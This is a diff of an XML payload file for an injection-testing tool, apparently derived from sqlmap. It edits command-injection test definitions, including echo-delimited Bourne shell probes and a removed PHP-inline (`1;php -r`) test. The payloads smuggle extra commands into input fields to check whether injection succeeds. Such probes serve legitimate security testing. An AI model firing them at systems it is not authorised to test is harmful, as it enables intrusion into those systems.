@@ -2,15 +2,15 @@
 
 <root>
     <test>
-        <title>sh Injection (One shot exf)</title>
+        <title>Command Injection (echo;echo;echo)</title>
         <stype>2</stype>
         <level>1</level>
         <risk>1</risk>
         <clause>2</clause>
         <where>1</where>
-        <vector>printf '[DELIMITER_START]';echo -n [QUERY];printf '[DELIMITER_STOP]'</vector>
+        <vector>echo -n [DELIMITER_START];echo -n [QUERY];echo -n [DELIMITER_STOP]</vector>
         <request>
-            <payload>printf '[DELIMITER_START]' ; if [ [RANDNUM] -eq [RANDNUM] ]; then echo -n '1' ;else echo -n '' ;fi; printf '[DELIMITER_STOP]'</payload>
+            <payload>echo -n [DELIMITER_START] ; if [ [RANDNUM] -eq [RANDNUM] ]; then echo -n 1 ;else echo -n 0 ;fi; echo -n [DELIMITER_STOP]</payload>
         </request>
         <response>
             <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
@@ -20,7 +20,7 @@
             <dbms_version>Bourne shell</dbms_version>
         </details>
     </test>
-
+<!--
     <test>
         <title>sh Injection - New Line/LF (One shot exf)</title>
         <stype>2</stype>
@@ -40,27 +40,7 @@
             <dbms_version>Bourne shell</dbms_version>
         </details>
     </test>
-
-    <test>
-        <title>Bash Injection - PHP inline (One shot exf)</title>
-        <stype>2</stype>
-        <level>2</level>
-        <risk>1</risk>
-        <clause>0</clause>
-        <where>1</where>
-        <vector>1;php -r "echo '[DELIMITER_START]';echo [QUERY];echo '[DELIMITER_STOP]';"</vector>
-        <request>
-            <payload>1;php -r "echo '[DELIMITER_START]' ; if([RANDNUM] == [RANDNUM]){echo '1';}else{echo '';} echo '[DELIMITER_STOP]';"</payload>
-        </request>
-        <response>
-            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
-        </response>
-        <details>
-            <dbms>PHP</dbms>
-            <dbms_version>&gt;= 5.5</dbms_version>
-        </details>
-    </test>
-
+-->
     <test>
         <title>PHP Injection (One shot exf)</title>
         <stype>2</stype>
@@ -70,10 +50,6 @@
         <where>1</where>
         <vector>echo "[DELIMITER_START]";echo [QUERY];echo "[DELIMITER_STOP]";</vector>
         <request>
-            <!-- These work as good as ELT(), but are longer
-            <payload>AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)),'[DELIMITER_STOP]','x'))s), 8446744073709551610, 8446744073709551610)))</payload>
-            <payload>AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',(SELECT (MAKE_SET([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]','x'))s), 8446744073709551610, 8446744073709551610)))</payload>
-            -->
             <payload>echo "[DELIMITER_START]" ; if([RANDNUM] == [RANDNUM]){echo "1";}else{echo "";} echo "[DELIMITER_STOP]";</payload>
         </request>
         <response>
